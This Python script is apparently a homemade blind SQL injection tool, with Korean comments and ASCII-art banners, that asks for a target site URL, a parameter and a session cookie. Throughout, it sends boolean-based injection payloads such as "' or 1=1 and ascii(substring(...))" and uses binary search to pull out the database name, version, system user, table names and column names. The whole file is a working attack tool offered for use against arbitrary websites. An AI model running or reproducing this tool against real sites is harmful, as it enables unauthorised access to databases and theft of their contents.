import requests
import time
import os
from tqdm import tqdm


def LinePrint(String, timeset=0.3):
    for i in String:
        print(i,end="")
        time.sleep(timeset)
    print("\n")


def send_data_text(url, method, cookie, pm='', query=''):
    payload = {pm :query}
    if(method == 0):
        return requests.get(url, params=payload, cookies=cookie)
    else:
        return requests.post(url, params=payload, cookies=cookie)

def SQL_union_based_injection(True_page, comment_text, site_url_to_attack, url_param_to_attack, get_or_post_requets_method, cookie):
    System_data_list = ["database()", "@@version", "system_user()"]
    system_information = []
    System_data_dict = {}
    #시스템 정보 파악
    for i in range(len(System_data_list)):
        length = 1
        System_length = 0
        #길이
        while True:
            Now_page = send_data_text(site_url_to_attack, get_or_post_requets_method, cookie, url_param_to_attack, 
                                "' or 1=1 and length(" + System_data_list[i]+ ") = " + str(length) + comment_text)
            print("[+]" + Now_page.url)
            if(Now_page.text == True_page):
                System_length = length
                print("[+]" + System_data_list[i] + " : length : " + str(System_length))
                length = 1
                break
            length += 1
        
        name = ""
        #문자열 추측
        number = list(range(32, 127))
        for j in tqdm(range(1, System_length + 1)):
            start, end = min(number), max(number)
            while True:
                mid = (start + end) // 2
                #정확하게 찾았을 떄
                Now_page = send_data_text(site_url_to_attack, get_or_post_requets_method, cookie, url_param_to_attack,
                                "' or 1=1 and ascii(substring(" + System_data_list[i] + ", " + str(j) + ", 1)) = '" + str(mid) + "'" + comment_text)
                print("[+]", Now_page.url)
                print("[+]mid : ", str(mid), " : ", chr(mid))
                if(Now_page.text == True_page):
                    break
                Now_page = send_data_text(site_url_to_attack, get_or_post_requets_method, cookie, url_param_to_attack,
                                "' or 1=1 and ascii(substring(" + System_data_list[i] + ", " + str(j) + ", 1)) > '" + str(mid) + "'" + comment_text)
                print("[+]", Now_page.url)
                print("[+]mid : ", str(mid), " : ", chr(mid))
                #오른쪽에 있다면
                if(Now_page.text == True_page):
                    print("[+] -->")
                    start = mid + 1
                #왼쪽에 있다면
                else:
                    print("[+] <--")
                    end   = mid - 1
            name += chr(mid)
            print("[+]find : ", chr(mid))

        print("[+]"+str(i + 1)+" th system Extraction complete : " + System_data_list[i] + " : " + name)
        system_information.append(name)
    
        #정보 저장
        System_data_dict[System_data_list[i]] = system_information[i]

    #시스템 정보 출력
    print("-----------------------------")
    for key, value in System_data_dict.items():
        print("| " + key + " : " + value + " |")
    print("-----------------------------")  
    #테이블 개수 파악
    table_c = 0 #1
    while True:
        Now_page = send_data_text(site_url_to_attack, get_or_post_requets_method, cookie, url_param_to_attack,
                        "' or 1=1 and length((select table_name from information_schema.tables where table_type='base table' and table_schema='" + System_data_dict['database()']+ "' limit " + str(table_c) + ",1))" + comment_text)
        print(Now_page.url)
        if(Now_page.text == True_page):
            if(table_c == 0):
                table_c += 1
                print("[+]Find table : {"+str(table_c)+"} Counting.")
                break
            else:
                print("[+]Find table : {"+str(table_c)+"} Counting.")
                break
        table_c += 1
        
    print("-"*30)
    print("[+]Table Count : " + str(table_c))
    print("-"*30)
            
        
    table_information = []
    table_data_dict = {}
    #테이블 명 파악
    for i in range(table_c):
        length = 1
        while True:
            Now_page = send_data_text(site_url_to_attack, get_or_post_requets_method, cookie, url_param_to_attack,
                            "' or 1=1 and length((select table_name from information_schema.tables where table_type='base table' and table_schema='" + System_data_dict['database()']+ "' limit " + str(i) + ",1))=" + str(length) + comment_text)
            print("[+]", Now_page.url)
            if(Now_page.text == True_page):
                print("[+] " + str(i + 1) + "th : table length : " + str(length))
                break
            length += 1

        name = ""
        number = list(range(32, 127))
        for j in range(1, length + 1):
            start, end = min(number), max(number)
            while True:
                mid = (start + end) // 2
                Now_page = send_data_text(site_url_to_attack, get_or_post_requets_method, cookie, url_param_to_attack,
                    "' or 1=1 and ascii(substring((select table_name from information_schema.tables where table_type='base table' and table_schema='" + System_data_dict['database()']+ "' limit " + str(i) + ",1), " + str(j) +", 1)) = " + str(mid) + comment_text)
                print("[+]", Now_page.url)
                print("[+]mid : ", str(mid), " : ", chr(mid))
                if(Now_page.text == True_page):
                    break
                Now_page = send_data_text(site_url_to_attack, get_or_post_requets_method, cookie, url_param_to_attack,
                    "' or 1=1 and ascii(substring((select table_name from information_schema.tables where table_type='base table' and table_schema='" + System_data_dict['database()']+ "' limit " + str(i) + ",1), " + str(j) +", 1)) > " + str(mid) + comment_text)        
                print("[+]", Now_page.url)
                print("[+]mid : ", str(mid), " : ", chr(mid))
                #오른쪽에 있다면
                if(Now_page.text == True_page):
                    print("[+] -->")
                    start = mid + 1
                #왼쪽에 있다면
                else:
                    print("[+] <--")
                    end   = mid - 1
            name += chr(mid)
            print("[+]find : ", chr(mid))

        print("[+]"+str(i + 1)+"th Table Extraction complete : " + name)
        table_information.append(name)
        table_data_dict[table_information[i]] = table_information[i]

    #테이블 정보 출력
    print("-----------------------------")
    for key, value in table_data_dict.items():
        print("| " + key + " : " + value + " |")
    print("-----------------------------")

    show_columns = []
    for i in range(len(table_information)):
        #테이블의 컬럼 개수 파악 
        column_c = 0
        while True:
            Now_page =  send_data_text(site_url_to_attack, get_or_post_requets_method, cookie, url_param_to_attack,
                                "' or 1=1 and length((select column_name from information_schema.columns where table_name = '" + table_information[i] + "' limit " + str(column_c) + ", 1))" + comment_text)
            print("[+]", Now_page.url)
            if(Now_page.text != True_page): #거짓이라면
                if(column_c == 0):
                    column_c += 1
                print("[+]Find Column : {" + str(column_c) + "}" + " : Counting.")
                break
            else:
                column_c += 1
            
        print("-"*30)
        print("[+]("+table_information[i]+")Column : " + str(column_c))
        print("-"*30)
        #테이블의 컬럼명 파악
        for j in range(column_c):
            length = 1
            #테이블의 컬럼 길이 파악    
            while True:
                Now_page = Now_page =  send_data_text(site_url_to_attack, get_or_post_requets_method, cookie, url_param_to_attack,
                                            "' or 1=1 and length((select column_name from information_schema.columns where table_name = '" + table_information[i] + "' limit " + str(j) + ", 1))=" + str(length) + comment_text)
                print("[+]", Now_page.url)
                if(Now_page.text == True_page):
                    print("[+] " + str(j + 1) + "th : column length : " + str(length))
                    break
                length += 1
            number = list(range(32, 127))
            name = ""
            #테이블의 컬럼명 문자 추측
            for k in range(1, length + 1):
                start, end = min(number), max(number)
                while start <= end:
                    mid = (start + end) // 2
                    Now_page = send_data_text(site_url_to_attack, get_or_post_requets_method, cookie, url_param_to_attack,
                                            "' or 1=1 and ascii(substring((select column_name from information_schema.columns where table_name = '" + table_information[i] + "' limit " + str(j) + ", 1)," + str(k) + ",1)) = " + str(mid) + comment_text)
                                    
                    print("[+]", Now_page.url)
                    print("[+]mid : ", str(mid), " : ", chr(mid))
                    if(Now_page.text == True_page):
                        break
                    Now_page = send_data_text(site_url_to_attack, get_or_post_requets_method, cookie, url_param_to_attack,
                                            "' or 1=1 and ascii(substring((select column_name from information_schema.columns where table_name = '" + table_information[i] + "' limit " + str(j) + ", 1)," + str(k) + ",1)) > " + str(mid) + comment_text)
                    print("[+]", Now_page.url)
                    print("[+]mid : ", str(mid), " : ", chr(mid))
                    #오른쪽에 있다면
                    if(Now_page.text == True_page):
                        print("[+] -->")
                        start = mid + 1
                    #왼쪽에 있다면
                    else:
                        print("[+] <--")
                        end   = mid - 1
                name += chr(mid)
                print("[+]find : ", chr(mid))

            print("[+]Find : "+table_information[i]+" : Column Name : " + name)
            show_columns.append(name)
        #컬럼 정보 출력
        print("-----------------------------")
        for value in show_columns:
            print("| " + table_information[i] + " : " + value + " |")
        print("-----------------------------")
        show_columns.clear()
            
    

print("""
 _____  _____  _           _           _              _    _                     _                  _ 
/  ___||  _  || |         (_)         (_)            | |  (_)                   | |                | |
\ `--. | | | || |          _  _ __     _   ___   ___ | |_  _   ___   _ __       | |_   ___    ___  | |
 `--. \| | | || |         | || '_ \   | | / _ \ / __|| __|| | / _ \ | '_ \      | __| / _ \  / _ \ | |
/\__/ /\ \/' /| |____     | || | | |  | ||  __/| (__ | |_ | || (_) || | | |     | |_ | (_) || (_) || |
\____/  \_/\_\\_____/     |_||_| |_|  | | \___| \___| \__||_| \___/ |_| |_|      \__| \___/  \___/ |_|
                                     _/ |                                                             
                                    |__/                                                              
""")
print("""

                                       ___                                    _____         _                    
                                      |_  |                                  /  ___|       (_)                   
                                        | |  ___    __ _  _ __ ___           \ `--.  _ __   _  _ __    ___  _ __ 
                                        | | / _ \  / _` || '_ ` _ \           `--. \| '_ \ | || '_ \  / _ \| '__|
                                    /\__/ /| (_) || (_| || | | | | |         /\__/ /| | | || || |_) ||  __/| |   
                                    \____/  \___/  \__,_||_| |_| |_|         \____/ |_| |_||_|| .__/  \___||_|   
                                                                                              | |                
                                                                                              |_|                

""")


site_url_to_attack              =       input("Web site url to attack             : ")
url_param_to_attack             =       input("Url paramiter to attack            : ")
False_page_url                  =       input("False page URL                     : ")
print("----------------------")
print("| Search         : 0 |")
print("| Select         : X |")
print("| Soap           : X |")
print("| Time Based     : X |")
print("| Boolean Based  : X |")
print("----------------------")
web_service_diversity           =       int(input("=> Web Site service category   : "))
print("----------------------")
print("| GET            : 0 |")
print("| POST           : 1 |")
print("----------------------")
get_or_post_requets_method      =       int(input("=> method                     : "))
print("[+] Does the site being attacked provide cookie values?(for session)")
cookie_session_name         =        ''
cookie_session_value        =        ''
if(input("[Y / N] : ") == 'Y'):
    cookie_session_name         =       input("Cookie Name                       : ")
    cookie_session_value        =       input("Cookie valule                     : ")
    
cookie = {cookie_session_name : cookie_session_value}

while True:
    #서비스 유형 : Search
    if(web_service_diversity == 0): 
        #취약점 판별하기 위한 페이지.
        default_page = send_data_text(site_url_to_attack, get_or_post_requets_method, cookie, url_param_to_attack, "'")
        print("[+]" + default_page.url)
        #취약점 여부 확인.
        if "error" in default_page.text: 
            print("Possible attacked. :)")
            print("Are you sure you want to attack? [Y / N] : ", end="")
            if(input() == 'Y'):
                #주석 문자 파악&참인 페이지 파악
                if(send_data_text(site_url_to_attack, get_or_post_requets_method, cookie, url_param_to_attack, "' or 1=1#").text != send_data_text(False_page_url, get_or_post_requets_method, cookie).text):
                    True_page = send_data_text(site_url_to_attack, get_or_post_requets_method, cookie, url_param_to_attack, "' or 1=1#").text
                    comment_text = "#"
                if(send_data_text(site_url_to_attack, get_or_post_requets_method, cookie, url_param_to_attack, "' or 1=1--").text != send_data_text(False_page_url, get_or_post_requets_method, cookie).text):
                    True_page = send_data_text(site_url_to_attack, get_or_post_requets_method, cookie, url_param_to_attack, "' or 1=1--").text
                    comment_text = "--"
                #시스템 정보 파악
                SQL_union_based_injection(True_page, comment_text, site_url_to_attack, url_param_to_attack, get_or_post_requets_method, cookie)
            else:
                exit(0)
        else:
            print("Not attacked. :(")
            exit(0)